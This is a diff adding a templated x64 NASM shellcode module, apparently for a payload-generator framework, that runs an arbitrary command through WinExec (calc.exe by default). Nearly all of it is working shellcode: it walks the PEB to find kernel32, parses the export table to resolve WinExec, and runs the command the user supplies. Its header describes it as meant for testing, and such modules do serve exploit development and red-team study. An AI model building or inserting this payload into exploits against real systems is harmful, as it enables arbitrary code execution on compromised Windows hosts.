@@ -1,0 +1,141 @@
+#!name##WinExec
+#!types##scode
+#!info##Creates a shellcode that uses the WinExec function to launch a specified program. Primarily intended for testing purposes. You can build a custom command yourself; by default, it launches the calculator (calc.exe). The shellcode contains null bytes, and its typical size is around 255 bytes.
+#!NullBytes##True
+#!system_FLAG##[W]
+#!TAGS##[SCode]
+#!reqVar##WE_cmd##Command to execute by WinExec function.##str
+#!setVar##WE_cmd##calc.exe##str
+
+{% set WE_EXE = TOOL.asm_build_stack(WE_cmd) %}
+
+BITS 64
+
+
+section .text
+global main
+main:
+
+    ; get WinExec addr
+    mov rax, 0x00636578456E6957
+    push rax
+    mov rcx, rsp
+    lea rdx, [rel exe]
+    jmp DuckTales
+
+    ; --- "calc.exe\0" ---
+   ; mov rax, 0x6578652E636C6163 ; "calc.exe"
+    ;mov rax, 0x6578652e636c6163
+
+ 
+
+exe:
+    add rsp, 8
+{{WE_EXE[0]}}
+    mov rcx, rsp
+    sub rsp, {{WE_EXE[1]}}
+    xor rdx, rdx
+    inc rdx
+    call rax
+    add rsp, {{WE_EXE[2]}}
+    
+    ret
+    
+      
+          
+
+DuckTales:
+    ; find function name and back
+    ; Null bytes free
+    ; IN: rcx - pointer to function name
+    ; IN: rdx - pointer to callback
+    ; OUT: rax - function address
+    
+    push rbp
+    mov rbp, rsp
+    push rsi
+    push rdi
+    push r14
+    push r15
+    sub rsp, 16     ; space for local variable
+    mov [rbp-8], rcx    ; function name
+    mov [rbp-16], rdx   ; return address
+    
+    ; get kernel32 and Export Table address
+    ; r14 - kernel32 addr
+    ; r15 - export table
+    xor rcx, rcx
+    mov rcx, gs:[rcx+0x60]  ; Get address of PEB struct (avoid null bytes)
+    mov rcx, [rcx+0x18]     ; Get PEB_LDR_DATA address
+    mov rcx, [rcx+0x20]     ; Get InMemoryOrderModuleList
+    mov rcx, [rcx]      ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rcx, [rcx]      ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov r14, [rcx+0x20] ; Get kernel32.dll address
+    
+    xor rcx, rcx
+    mov ecx, [r14+0x3c] ; get pointer to PE header  (pointer have RVAddress )
+    add rcx, r14    ; RVA PE header + kernel32 = VA PE header of kernel32
+    add rcx, 0x44
+    add rcx, 0x44   ;  0x88 bytes after the PE signature is the RVA for the Export Table
+    mov r15d, [rcx]  ; get RVA of Export Table
+    add r15, r14    ; RVA export table + VA kernel32 = VA export table
+    
+    mov r8d , [r15+0x14]     ; get number of function
+    xor rdx, rdx    ; 'function number' counter
+    xor r9, r9
+    xor rcx, rcx  ; 
+    ; r8 - number of function
+    ; rdx - actual function number
+    ; r10 - length function name
+    xor r10, r10    ; str len counter
+    mov rax, [rbp-8]
+    .match_len:
+        mov byte cl, [rax+r10]
+        cmp cl, r9b
+        je .find_name
+        inc r10
+        jmp .match_len
+    
+    .find_name:
+        cmp rdx, r8     ; check function limit
+        jg .not_find
+        mov esi, [r15+0x20]     ; RVA function name from export table
+        add rsi, r14        ; RVA function name + VA kernel32 = VA function name
+        mov esi, [rsi+4*rdx]    ; get next entry RVA function name
+        add rsi, r14        ; RVA name + kernel32 addr
+        ; rsi = function name from export table
+        ; compare function name
+        mov rdi, [rbp-8]    ; our func name
+        mov rcx, r10    ; func name length
+        cld
+        repe cmpsb
+        jnz .check_next
+        
+        ; get function addres
+        mov edi, [r15+0x24]     ; get AddressOfNameOrdinals RVA
+        add rdi, r14        ; AddressOfNameOrdinals RVA + kernel32 VA
+        xor rsi, rsi
+        mov si, [rdi+2*rdx]    ; get function index (word) to function address
+        mov edi, [r15+0x1c]     ; get AddressOfFunctions RVA
+        add rdi, r14    ; AddressOfFunctions RVA + kernel32 VA
+        mov edi, [rdi+4*rsi]    ; get RVA function address
+        add rdi, r14    ; function addr RVA + kernel32 VA
+        mov rax, rdi    ; return func addr
+    
+    .return:
+        mov rcx, [rbp-16]   ; return addr
+        add rsp, 16 ; restore stack
+        pop r15
+        pop r14
+        pop rdi
+        pop rsi
+        pop rbp
+        jmp exe
+     
+     .not_find:
+        xor rax, rax
+        jmp .return
+        
+    .check_next:
+        inc rdx     ; increase main func counter
+        jmp .find_name
